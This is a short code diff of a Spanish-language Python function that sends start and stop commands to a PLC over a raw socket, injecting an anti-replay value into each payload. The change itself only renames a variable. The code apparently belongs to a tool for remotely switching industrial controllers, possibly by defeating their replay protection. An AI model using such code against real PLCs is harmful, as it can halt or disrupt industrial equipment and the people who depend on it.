@@ -259,17 +259,17 @@ def fEncApagPLC(pHostPLC, pAction):
 
   if pAction == "Encender":
     # Inyectar anti-replay al payload de encender y enviarlo 
-    vPayloadParaEncenderElPLC = fInsertarAntiReplay(vPayloadParaEncenderElPLC)
-    print(f"Enviando encendido con antireplay: {vPayloadParaEncenderElPLC.hex()}")
-    vSocketConPLC.send(vPayloadParaEncenderElPLC)
+    vPayloadConAntiReplay = fInsertarAntiReplay(vPayloadParaEncenderElPLC)
+    print(f"Enviando encendido con antireplay: {vPayloadConAntiReplay.hex()}")
+    vSocketConPLC.send(vPayloadConAntiReplay)
     vPayloadDeRespAlEncendido = vSocketConPLC.recv(1024)
     print(f"Respuesta: {vPayloadDeRespAlEncendido.hex()} \n")
     vSocketConPLC.close()
   elif pAction == "Apagar":
     # Inyectar anti-replay al payload de apagar y enviarlo 
-    vPayloadParaApagarElPLC = fInsertarAntiReplay(vPayloadParaApagarElPLC)
-    print(f"Enviando apagado con antireplay: {vPayloadParaApagarElPLC.hex()}")
-    vSocketConPLC.send(vPayloadParaApagarElPLC)
+    vPayloadConAntiReplay = fInsertarAntiReplay(vPayloadParaApagarElPLC)
+    print(f"Enviando apagado con antireplay: {vPayloadConAntiReplay.hex()}")
+    vSocketConPLC.send(vPayloadConAntiReplay)
     vPayloadDeRespAlApagado = vSocketConPLC.recv(1024)
     print(f"Respuesta: {vPayloadDeRespAlApagado.hex()} \n")
     vSocketConPLC.close()
